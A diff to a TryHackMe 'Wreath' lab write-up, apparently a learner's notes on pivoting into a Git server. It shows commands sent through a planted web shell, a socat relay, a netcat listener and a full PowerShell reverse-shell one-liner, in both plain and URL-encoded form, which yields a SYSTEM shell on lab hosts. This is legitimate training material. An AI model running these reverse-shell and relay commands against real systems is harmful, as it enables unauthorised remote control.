@@ -1410,7 +1410,7 @@ kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.ph
 " 
 ```
 
-OS 
+Find OS  - `Windows`
 ```
 kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=systeminfo"
 "
@@ -1463,8 +1463,94 @@ Hyper-V Requirements:      A hypervisor has been detected. Features required for
 " 
 ```
 
+We now need to check if the compromised server can access the outside world internet. 
+
+- `tcpdump` capture
+- `ping` to our IP
+
+1. On our attacking machine: run `tcpdump` with `tun0` interface - `tcpdump -i tun0 icmp`. If our VPN is not using the `tun0` interface, we can check with `ip -a link`
+2. On compromised server: run `ping -n 3 ATTACKING_IP`
+
+Attacking machine - start `tcpdump`
+```
+kali@kali:~/thm/wreath$ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+```
+
+Attacking machine - run `ping`
+```
+kali@kali:~/thm/wreath$ curl -X POST http://gitserver.thm/web/exploit-Neozer0.php -d "a=ping -n 3 10.50.86.79"
+"
+Pinging 10.50.86.79 with 32 bytes of data:
+Request timed out.
+Request timed out.
+Request timed out.
+
+Ping statistics for 10.50.86.79:
+    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
+" 
+```
+
+Unfortunately no ping packets make it to our listener. We have two options
+
+- Copy over `netcat` to our stable webshell in `.200`. Use this is catch a shell there; or
+- Setup a relay in `.200` to forward shell back to listener
+
+Lets choose socat relay.
+
+1. Open desired ports in the firewall. This is because CentOS has a wrapper around IPTables firewall called `firewalld`
+
+`firewall-cmd --zone=public --add-port PORT/tcp`
+
+`--zone=public` - apply rule to every inbound connection to this port
+
+Web server .200
+```
+[root@prod-serv ~]# firewall-cmd --zone=public --add-port 29999/tcp
+success
+```
+
+2. Set up nc listener on attacking machine
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 30000
+listening on [any] 30000 ...
+```
+
+3. Set up a relay on .200 (pass through to attacking machine)
+```
+[root@prod-serv tmp]# ./socat-Neozer0 tcp-l:29999 tcp:10.50.82.56:30000 &
+[1] 2902
+```
+
+4. Execute a reverse shell
+
+Use this command to get a reverse shell - use web server IP and port that was just opened
+```
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.85.200',29999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+Need to url encode the command first if using `curl`
+
+Attacking machine
+```
+kali@kali:~/thm/wreath$ curl -X POST -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.85.200%27%2C29999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22" http://gitserver.thm/web/exploit-Neozer0.php
+```
+
+We receive a shell on our attacking machine!!
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 30000
+[sudo] password for kali: 
+listening on [any] 30000 ...
+connect to [10.50.86.79] from (UNKNOWN) [10.200.85.200] 46412
+whoami
+nt authority\system
+PS C:\GitStack\gitphp> 
+```
 
 ### Port forward method
+
+The method is similar but the attacking IP is different
 
 We first run a port forward
 
@@ -1500,5 +1586,13 @@ kali@kali:~/thm/wreath$ curl -X POST http://localhost:8000/web/exploit-Neozer0.p
 " 
 ```
 
+Everything else is the same as the sshuttle
+
+</details>
+
+## 17. Git Server - Stabilisation and Post Exploitation
+
+<details>
+  <summary>---</summary>
 
 </details>
